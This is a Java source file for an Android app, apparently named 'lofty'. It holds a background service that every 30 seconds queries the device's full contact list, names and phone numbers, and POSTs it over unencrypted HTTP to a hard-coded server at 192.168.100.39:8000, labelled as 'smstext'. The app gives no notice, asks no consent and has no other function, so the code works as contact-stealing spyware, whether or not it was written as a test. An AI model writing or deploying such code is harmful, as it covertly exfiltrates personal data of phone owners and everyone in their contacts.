package com.sciatafrica.lofty;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.annotation.Nullable;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class ServiceTest extends Service {
    private static final String TAG = "ServiceTest";

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startRecurringTask();
        return Service.START_NOT_STICKY;
    }

    void startRecurringTask() {
        mHandler.postDelayed(mHandlerTask, INTERVAL);
    }

    void stopRecurringTask() {
        mHandler.removeCallbacks(mHandlerTask);
    }

    Handler mHandler = new Handler();
    private final static int INTERVAL = 1000 * 30; // 30 seconds

    Runnable mHandlerTask = new Runnable() {
        @Override
        public void run() {
            String res = "";
            try {
                res = new NetTask().execute(getContactList()).get();
                Log.d(TAG, "Contacts sent: " + res);
            } catch (Exception e) {
                Log.e(TAG, "Error sending contacts", e);
            }
            mHandler.postDelayed(mHandlerTask, INTERVAL);
        }
    };

    private String getContactList() {
        StringBuilder result = new StringBuilder();
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

        if (cur != null && cur.getCount() > 0) {
            while (cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                // Check if the contact has a phone number
                if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id},
                            null
                    );

                    if (pCur != null) {
                        while (pCur.moveToNext()) {
                            String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            Log.i(TAG, "NAME: " + name + " NO: " + phoneNo);
                            result.append(name).append("_").append(phoneNo).append(",");
                        }
                        pCur.close();
                    }
                }
            }
            cur.close();
        }

        return result.toString();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopRecurringTask();
    }
}

class NetTask extends AsyncTask<String, Integer, String> {
    private static final String TAG = "NetTask";

    @Override
    protected String doInBackground(String... params) {
        String res = httpPost(params[0]);
        return res;
    }

    private String httpPost(String text) {
        String response = "";
        HttpURLConnection conn = null;

        try {
            String url = "http://192.168.100.39:8000/post";
            URL urlObj = new URL(url);
            conn = (HttpURLConnection) urlObj.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Accept-Charset", "UTF-8");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setReadTimeout(10000);
            conn.setConnectTimeout(10000);

            String paramsString = "smstext=CONTACTS_" + text.replace(" ", "_");
            DataOutputStream wr = new DataOutputStream(conn.getOutputStream());
            wr.writeBytes(paramsString);
            wr.flush();
            wr.close();

            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                String line;
                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                while ((line = br.readLine()) != null) {
                    response += line;
                }
                br.close();
            } else {
                response = "HTTP Error: " + responseCode;
            }

        } catch (Exception e) {
            Log.e(TAG, "HTTP Post Error", e);
            response = "Error: " + e.getMessage();
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }
        return response;
    }
}